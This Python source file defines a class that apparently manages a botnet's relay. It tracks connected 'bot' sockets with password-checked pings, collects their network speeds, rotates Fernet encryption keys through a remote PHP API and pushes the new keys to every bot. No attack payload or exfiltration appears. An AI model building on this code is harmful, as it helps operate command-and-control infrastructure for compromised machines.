from colorama import Fore
from .config import rl_config_t as tconf
import time
import requests
from cryptography.fernet import Fernet



class Loops():

    def __init__(self, urlkey: str, api_url: str, fer: Fernet, gkey: list=[], speed: list=[], ogkey: list=[], passwd: str="", relaykey: str="", bots: dict={}):
        self.urlkey=urlkey
        self.api_url=api_url
        self.relaykey=relaykey
        self.speed=speed
        self.gkey=gkey
        self.ogkey=ogkey
        self.passwd=passwd
        self.bots=bots
        self.fer=fer



    def relay_api(self, data, act: bool):
        ip=data['ip']
        bots=data['bots']
        url=f"{self.api_url}/relays.php?urlkey={self.urlkey}&ip={ip}&bots={bots}&act={act}"
        try:
            r=requests.get(url).json()
            print(r)
            if r=="ok":
                return True
            else:
                return False
        except Exception as e:
            print(f"error \n{url}\n{e}\n\n")



    def send(self, socket, data: str, escape=True, reset=True):
        if reset:
            data += Fore.RESET
        if escape:
            data += '\r\n'
        socket.send(data.encode())



    def ping(self):
        while 1:
            dead_bots = []
            for bot in self.bots.keys():
                try:
                    bot.settimeout(3)
                    self.send(bot, 'PING', False, False)
                    if bot.recv(1024).decode() != f'PONG[p:{self.passwd}]':
                        dead_bots.append(bot)
                except:
                    dead_bots.append(bot)
                
            for bot in dead_bots:
                self.bots.pop(bot)
                bot.close()
            time.sleep(tconf.ping_t)



    def net(self):
        while 1:
            while self.speed!=[]:
                for i in self.speed:
                    self.speed.remove(i)
            dead_bots = []
            for bot in self.bots.keys():
                try:
                    bot.settimeout(3)
                    self.send(bot, f'NETSPEED', False, False)
                    data=bot.recv(1024).decode()
                    try:
                        if not int(data):
                            dead_bots.append(bot)
                        else:
                            self.speed.append(int(data))
                    except:
                        self.speed.append(int(data))
                except:
                    dead_bots.append(bot)
                
            for bot in dead_bots:
                self.bots.pop(bot)
                bot.close()
            time.sleep(tconf.net_t)



    def api_key(self, gkey: str):
        url=f"{self.api_url}/genkey.php?urlkey={self.urlkey}&gkey={gkey}"
        try:
            r=requests.get(url).json()
            print(r)
            if r=="ok":
                return True
            else:
                return False
        except Exception as e:
            print(f"error \n{url}\n{e}\n\n")



    def genkey(self):
        while 1:
            time.sleep(tconf.genkey_t)
            while self.gkey!=[]:
                for i in self.gkey:
                    self.gkey.remove(i)
            ngkey=Fernet.generate_key().decode()
            print(ngkey)
            self.gkey.append(ngkey)
            k=[]
            ke=[]
            if self.ogkey!=[]:
                f=Fernet(self.ogkey)
                k.append(f.encrypt(f'GKEY:[{ngkey}]'.encode()).decode())
                for i in k:
                    if self.api_key(i):
                        print("apikey op")
                    else:
                        print("apikey error")
            else:
                ke.append(self.fer.encrypt(f'GKEY:[{ngkey}]'.encode()).decode())
                for i in ke:
                    if self.api_key(i):
                        print("apikey op")
                    else:
                        print("apikey error")
            dead_bots=[]
            for bot in self.bots.keys():
                try:
                    bot.settimeout(3)
                    if k!=[]:
                        for i in k:
                            self.send(bot, i, False, False)
                    elif ke!=[]:
                        for i in ke:
                            self.send(bot, f"GK{i}", False, False)
                    else:
                        print("error")
                except:
                    dead_bots.append(bot)
                
            for bot in dead_bots:
                self.bots.pop(bot)
                bot.close()